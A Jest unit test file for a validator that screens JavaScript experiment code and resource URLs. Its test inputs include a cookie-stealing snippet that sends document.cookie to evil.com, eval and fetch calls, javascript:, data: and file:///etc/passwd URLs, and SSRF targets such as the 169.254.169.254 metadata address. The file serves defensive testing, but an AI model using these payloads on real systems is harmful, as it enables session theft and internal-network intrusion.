/**
 * Unit tests for code validator
 * Tests validation of JavaScript code before execution
 */

import { validateExperimentCode, validateExperimentURL } from '../code-validator'

describe('Code Validator', () => {
  describe('validateExperimentCode', () => {
    describe('valid safe code', () => {
      it('should allow simple variable assignment', () => {
        const result = validateExperimentCode('var x = 5;')
        expect(result.valid).toBe(true)
        expect(result.warnings).toBeUndefined()
      })

      it('should allow DOM manipulation', () => {
        const result = validateExperimentCode('document.getElementById("test").textContent = "hello";')
        expect(result.valid).toBe(true)
      })

      it('should allow console logging', () => {
        const result = validateExperimentCode('console.log("test");')
        expect(result.valid).toBe(true)
      })

      it('should allow function declaration', () => {
        const result = validateExperimentCode('function test() { return 42; }')
        expect(result.valid).toBe(true)
      })

      it('should allow array operations', () => {
        const result = validateExperimentCode('var arr = [1, 2, 3]; arr.forEach(x => console.log(x));')
        expect(result.valid).toBe(true)
      })

      it('should allow object manipulation', () => {
        const result = validateExperimentCode('var obj = { a: 1 }; obj.b = 2;')
        expect(result.valid).toBe(true)
      })

      it('should allow string operations', () => {
        const result = validateExperimentCode('var str = "hello"; str.toUpperCase();')
        expect(result.valid).toBe(true)
      })

      it('should allow math operations', () => {
        const result = validateExperimentCode('var result = Math.floor(Math.random() * 100);')
        expect(result.valid).toBe(true)
      })

      it('should allow conditional logic', () => {
        const result = validateExperimentCode('if (x > 5) { console.log("big"); }')
        expect(result.valid).toBe(true)
      })

      it('should allow safe loops', () => {
        const result = validateExperimentCode('for (var i = 0; i < 10; i++) { console.log(i); }')
        expect(result.valid).toBe(true)
      })
    })

    describe('critical security violations', () => {
      it('should block eval() call', () => {
        const result = validateExperimentCode('eval("alert(1)");')
        expect(result.valid).toBe(false)
        expect(result.reason).toContain('eval()')
      })

      it('should block eval with spaces', () => {
        const result = validateExperimentCode('eval ("malicious code");')
        expect(result.valid).toBe(false)
      })

      it('should block Function constructor', () => {
        const result = validateExperimentCode('new Function("alert(1)")();')
        expect(result.valid).toBe(false)
        expect(result.reason).toContain('Function constructor')
      })

      it('should block Function with spaces', () => {
        const result = validateExperimentCode('Function ("return 1")();')
        expect(result.valid).toBe(false)
      })

      it('should block document.cookie access', () => {
        const result = validateExperimentCode('var c = document.cookie;')
        expect(result.valid).toBe(false)
        expect(result.reason).toContain('cookie')
      })

      it('should block document.cookie with uppercase', () => {
        const result = validateExperimentCode('var c = document.COOKIE;')
        expect(result.valid).toBe(false)
      })

      it('should block localStorage access', () => {
        const result = validateExperimentCode('localStorage.setItem("key", "value");')
        expect(result.valid).toBe(false)
        expect(result.reason).toContain('localStorage')
      })

      it('should block localStorage with uppercase', () => {
        const result = validateExperimentCode('LOCALSTORAGE.getItem("key");')
        expect(result.valid).toBe(false)
      })

      it('should block sessionStorage access', () => {
        const result = validateExperimentCode('sessionStorage.clear();')
        expect(result.valid).toBe(false)
        expect(result.reason).toContain('sessionStorage')
      })

      it('should block XMLHttpRequest', () => {
        const result = validateExperimentCode('var xhr = new XMLHttpRequest();')
        expect(result.valid).toBe(false)
        expect(result.reason).toContain('XMLHttpRequest')
      })

      it('should block fetch() call', () => {
        const result = validateExperimentCode('fetch("https://evil.com/steal");')
        expect(result.valid).toBe(false)
        expect(result.reason).toContain('fetch()')
      })

      it('should block fetch with spaces', () => {
        const result = validateExperimentCode('fetch ("https://api.com");')
        expect(result.valid).toBe(false)
      })

      it('should block dynamic import', () => {
        const result = validateExperimentCode('import("./malicious.js");')
        expect(result.valid).toBe(false)
        expect(result.reason).toContain('import()')
      })

      it('should block require() call', () => {
        const result = validateExperimentCode('var fs = require("fs");')
        expect(result.valid).toBe(false)
        expect(result.reason).toContain('require()')
      })

      it('should block chrome API access', () => {
        const result = validateExperimentCode('chrome.runtime.sendMessage({});')
        expect(result.valid).toBe(false)
        expect(result.reason).toContain('Chrome API')
      })

      it('should block chrome with uppercase', () => {
        const result = validateExperimentCode('CHROME.storage.get();')
        expect(result.valid).toBe(false)
      })

      it('should block browser API access', () => {
        const result = validateExperimentCode('browser.tabs.query({});')
        expect(result.valid).toBe(false)
        expect(result.reason).toContain('Browser API')
      })

      it('should block __proto__ manipulation', () => {
        const result = validateExperimentCode('obj.__proto__ = malicious;')
        expect(result.valid).toBe(false)
        expect(result.reason).toContain('Prototype manipulation')
      })
    })

    describe('high severity warnings', () => {
      it('should warn about .constructor access', () => {
        const result = validateExperimentCode('var c = obj.constructor;')
        expect(result.valid).toBe(true)
        expect(result.warnings).toBeDefined()
        expect(result.warnings).toContain('Constructor access detected')
      })

      it('should warn about infinite while loop', () => {
        const result = validateExperimentCode('while (true) { }')
        expect(result.valid).toBe(true)
        expect(result.warnings).toContain('Infinite while loop detected')
      })

      it('should warn about infinite while with spaces', () => {
        const result = validateExperimentCode('while ( true ) { console.log("loop"); }')
        expect(result.valid).toBe(true)
        expect(result.warnings).toBeDefined()
      })

      it('should warn about infinite for loop', () => {
        const result = validateExperimentCode('for (;;) { }')
        expect(result.valid).toBe(true)
        expect(result.warnings).toContain('Infinite for loop detected')
      })

      it('should warn about infinite for with spaces', () => {
        const result = validateExperimentCode('for ( ; ; ) { }')
        expect(result.valid).toBe(true)
        expect(result.warnings).toBeDefined()
      })
    })

    describe('input validation', () => {
      it('should reject empty string', () => {
        const result = validateExperimentCode('')
        expect(result.valid).toBe(false)
        expect(result.reason).toContain('non-empty string')
      })

      it('should reject null', () => {
        const result = validateExperimentCode(null as any)
        expect(result.valid).toBe(false)
        expect(result.reason).toContain('non-empty string')
      })

      it('should reject undefined', () => {
        const result = validateExperimentCode(undefined as any)
        expect(result.valid).toBe(false)
        expect(result.reason).toContain('non-empty string')
      })

      it('should reject non-string input', () => {
        const result = validateExperimentCode(123 as any)
        expect(result.valid).toBe(false)
      })

      it('should reject code exceeding max length', () => {
        const longCode = 'var x = 1;'.repeat(10000)
        const result = validateExperimentCode(longCode)
        expect(result.valid).toBe(false)
        expect(result.reason).toContain('maximum length')
      })

      it('should allow code at exactly max length', () => {
        const maxCode = 'a'.repeat(50000)
        const result = validateExperimentCode(maxCode)
        expect(result.valid).toBe(true)
      })

      it('should reject code just over max length', () => {
        const tooLong = 'a'.repeat(50001)
        const result = validateExperimentCode(tooLong)
        expect(result.valid).toBe(false)
      })
    })

    describe('edge cases and complex scenarios', () => {
      it('should block eval even in comments', () => {
        const result = validateExperimentCode('var x = 5; eval("test");')
        expect(result.valid).toBe(false)
      })

      it('should allow word "evaluation" which contains "eval"', () => {
        const result = validateExperimentCode('var evaluation = "test";')
        expect(result.valid).toBe(true)
      })

      it('should block multiple violations', () => {
        const result = validateExperimentCode('eval("x"); fetch("url"); document.cookie;')
        expect(result.valid).toBe(false)
      })

      it('should allow complex safe code', () => {
        const code = `
          function updateUI() {
            var element = document.getElementById("test");
            if (element) {
              element.style.display = "block";
              element.textContent = "Updated";
            }
          }
          updateUI();
        `
        const result = validateExperimentCode(code)
        expect(result.valid).toBe(true)
      })

      it('should allow jQuery-style code', () => {
        const result = validateExperimentCode('$(".button").click(function() { alert("clicked"); });')
        expect(result.valid).toBe(true)
      })

      it('should allow ES6 features', () => {
        const code = `
          const items = [1, 2, 3];
          const doubled = items.map(x => x * 2);
          const filtered = items.filter(x => x > 1);
        `
        const result = validateExperimentCode(code)
        expect(result.valid).toBe(true)
      })

      it('should block constructor even in safe-looking code', () => {
        const result = validateExperimentCode('var safe = obj.constructor.prototype;')
        expect(result.valid).toBe(true)
        expect(result.warnings).toBeDefined()
      })
    })
  })

  describe('validateExperimentURL', () => {
    describe('valid URLs', () => {
      it('should allow HTTPS URL', () => {
        const result = validateExperimentURL('https://example.com/image.png')
        expect(result.valid).toBe(true)
      })

      it('should allow HTTP URL', () => {
        const result = validateExperimentURL('http://example.com/resource')
        expect(result.valid).toBe(true)
      })

      it('should allow URL with path', () => {
        const result = validateExperimentURL('https://cdn.example.com/assets/logo.png')
        expect(result.valid).toBe(true)
      })

      it('should allow URL with query parameters', () => {
        const result = validateExperimentURL('https://example.com/api?key=value&id=123')
        expect(result.valid).toBe(true)
      })

      it('should allow URL with fragment', () => {
        const result = validateExperimentURL('https://example.com/page#section')
        expect(result.valid).toBe(true)
      })

      it('should allow URL with port', () => {
        const result = validateExperimentURL('https://example.com:8080/api')
        expect(result.valid).toBe(true)
      })

      it('should allow public IP address', () => {
        const result = validateExperimentURL('https://8.8.8.8/')
        expect(result.valid).toBe(true)
      })
    })

    describe('blocked protocols', () => {
      it('should block javascript: protocol', () => {
        const result = validateExperimentURL('javascript:alert(1)')
        expect(result.valid).toBe(false)
        expect(result.reason).toContain('javascript:')
      })

      it('should block javascript: with uppercase', () => {
        const result = validateExperimentURL('JAVASCRIPT:alert(1)')
        expect(result.valid).toBe(false)
      })

      it('should block data: protocol', () => {
        const result = validateExperimentURL('data:text/html,<script>alert(1)</script>')
        expect(result.valid).toBe(false)
        expect(result.reason).toContain('data:')
      })

      it('should block file: protocol', () => {
        const result = validateExperimentURL('file:///etc/passwd')
        expect(result.valid).toBe(false)
        expect(result.reason).toContain('file:')
      })

      it('should block vbscript: protocol', () => {
        const result = validateExperimentURL('vbscript:msgbox(1)')
        expect(result.valid).toBe(false)
        expect(result.reason).toContain('vbscript:')
      })
    })

    describe('SSRF prevention', () => {
      it('should block localhost', () => {
        const result = validateExperimentURL('http://localhost/api')
        expect(result.valid).toBe(false)
        expect(result.reason).toContain('internal network')
      })

      it('should block 127.0.0.1', () => {
        const result = validateExperimentURL('http://127.0.0.1:3000/')
        expect(result.valid).toBe(false)
        expect(result.reason).toContain('127.0.0.1')
      })

      it('should block 0.0.0.0', () => {
        const result = validateExperimentURL('http://0.0.0.0/')
        expect(result.valid).toBe(false)
        expect(result.reason).toContain('0.0.0.0')
      })

      it('should block 169.254.x.x (link-local)', () => {
        const result = validateExperimentURL('http://169.254.169.254/metadata')
        expect(result.valid).toBe(false)
      })

      it('should block 192.168.x.x', () => {
        const result = validateExperimentURL('http://192.168.1.1/')
        expect(result.valid).toBe(false)
        expect(result.reason).toContain('192.168.1.1')
      })

      it('should block 10.x.x.x', () => {
        const result = validateExperimentURL('http://10.0.0.1/')
        expect(result.valid).toBe(false)
        expect(result.reason).toContain('10.0.0.1')
      })

      it('should block 172.16.x.x through 172.31.x.x', () => {
        expect(validateExperimentURL('http://172.16.0.1/').valid).toBe(false)
        expect(validateExperimentURL('http://172.20.0.1/').valid).toBe(false)
        expect(validateExperimentURL('http://172.31.255.255/').valid).toBe(false)
      })

      it('should allow 172.15.x.x (outside private range)', () => {
        const result = validateExperimentURL('http://172.15.0.1/')
        expect(result.valid).toBe(true)
      })

      it('should allow 172.32.x.x (outside private range)', () => {
        const result = validateExperimentURL('http://172.32.0.1/')
        expect(result.valid).toBe(true)
      })
    })

    describe('input validation', () => {
      it('should reject empty string', () => {
        const result = validateExperimentURL('')
        expect(result.valid).toBe(false)
        expect(result.reason).toContain('non-empty string')
      })

      it('should reject null', () => {
        const result = validateExperimentURL(null as any)
        expect(result.valid).toBe(false)
      })

      it('should reject undefined', () => {
        const result = validateExperimentURL(undefined as any)
        expect(result.valid).toBe(false)
      })

      it('should reject non-string', () => {
        const result = validateExperimentURL(123 as any)
        expect(result.valid).toBe(false)
      })

      it('should reject invalid URL format', () => {
        const result = validateExperimentURL('not-a-url')
        expect(result.valid).toBe(false)
        expect(result.reason).toContain('Invalid URL format')
      })

      it('should reject malformed URL', () => {
        const result = validateExperimentURL('http://?invalid')
        expect(result.valid).toBe(false)
      })
    })

    describe('edge cases', () => {
      it('should handle URL with auth credentials', () => {
        const result = validateExperimentURL('https://user:pass@example.com/')
        expect(result.valid).toBe(true)
      })

      it('should handle very long URL', () => {
        const longPath = 'a'.repeat(1000)
        const result = validateExperimentURL(`https://example.com/${longPath}`)
        expect(result.valid).toBe(true)
      })

      it('should block localhost with different case', () => {
        const result = validateExperimentURL('http://LOCALHOST/')
        expect(result.valid).toBe(false)
      })

      it('should allow CDN URLs', () => {
        expect(validateExperimentURL('https://cdn.jsdelivr.net/npm/package').valid).toBe(true)
        expect(validateExperimentURL('https://unpkg.com/package').valid).toBe(true)
        expect(validateExperimentURL('https://cdnjs.cloudflare.com/ajax/libs/').valid).toBe(true)
      })
    })
  })

  describe('integration scenarios', () => {
    it('should validate complete experiment code flow', () => {
      const code = `
        var button = document.getElementById("cta-button");
        if (button) {
          button.style.backgroundColor = "#FF0000";
          button.textContent = "Click Here Now!";
        }
      `
      const result = validateExperimentCode(code)
      expect(result.valid).toBe(true)
      expect(result.warnings).toBeUndefined()
    })

    it('should block malicious experiment code', () => {
      const code = `
        var data = document.cookie;
        fetch("https://evil.com/steal?data=" + data);
      `
      const result = validateExperimentCode(code)
      expect(result.valid).toBe(false)
    })

    it('should allow safe resource URLs', () => {
      const urls = [
        'https://cdn.example.com/images/logo.png',
        'https://fonts.googleapis.com/css?family=Roboto',
        'https://example.com/api/data.json'
      ]

      for (const url of urls) {
        const result = validateExperimentURL(url)
        expect(result.valid).toBe(true)
      }
    })

    it('should block internal resource access', () => {
      const urls = [
        'http://localhost:3000/admin',
        'http://127.0.0.1/config',
        'http://192.168.1.1/router',
        'http://10.0.0.1/internal'
      ]

      for (const url of urls) {
        const result = validateExperimentURL(url)
        expect(result.valid).toBe(false)
      }
    })
  })
})
